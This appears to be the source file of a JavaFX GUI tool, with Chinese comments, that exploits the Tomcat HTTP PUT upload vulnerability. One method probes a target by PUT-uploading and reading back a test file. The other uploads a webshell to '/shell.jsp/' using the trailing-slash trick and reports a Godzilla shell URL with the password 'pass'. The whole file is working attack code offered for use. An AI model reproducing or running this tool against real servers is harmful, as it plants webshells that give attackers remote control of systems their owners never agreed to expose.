package sample;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import lib.src.main.java.com.github.kevinsawicki.http.HttpRequest;

public class Controller {
    @FXML
    private TextField targetAddress;

    @FXML
    private Button checkBut;

    @FXML
    private TextArea logTextArea;

    @FXML
    private TextField catalogue;

    @FXML
    private Button uplaodBtn;

    @FXML
    private TextField webshellUrl;

    @FXML
    private TextArea webshellText;


    //上传webshell
    @FXML
    void uploadFile(ActionEvent event) {
        String url = targetAddress.getText();
        String payload;
        String weshellCate;
        if (catalogue.getText().isEmpty() == true) {
            weshellCate = "/shell.jsp";
        } else {
            weshellCate = catalogue.getText();
        }
        if (webshellText.getText().isEmpty() == true) {
            payload = webshellText.getPromptText();
        } else {
            payload = webshellText.getText();
        }
        HttpRequest request = HttpRequest.put(url + weshellCate + "/").send(payload);
        HttpRequest response = HttpRequest.get(url + weshellCate);
        System.out.println(response.body());
        System.out.println(request.code());
        System.out.println(response.code());
        if (response.code() == 200) {
            webshellUrl.setText("哥斯拉url：" + url + weshellCate + " " + "pass：pass");
        }
    }

    //检测是否存在Tomcat PUT漏洞
    public void clickBut(ActionEvent actionEvent) {
        //获取检测目标url地址
        String url = targetAddress.getText();
        String payload = "1.txt";
        HttpRequest httpRequest = HttpRequest.put(url + payload).send("test");
        HttpRequest getRequest = HttpRequest.get(url + payload);
        String response = getRequest.body();
        System.out.println(response);
        if (response.equals("test") && getRequest.code() == 200) {
            logTextArea.setText("存在Tomcat PUT漏洞，请上传webshell进行利用");
        }
    }


    //上传webshell

}
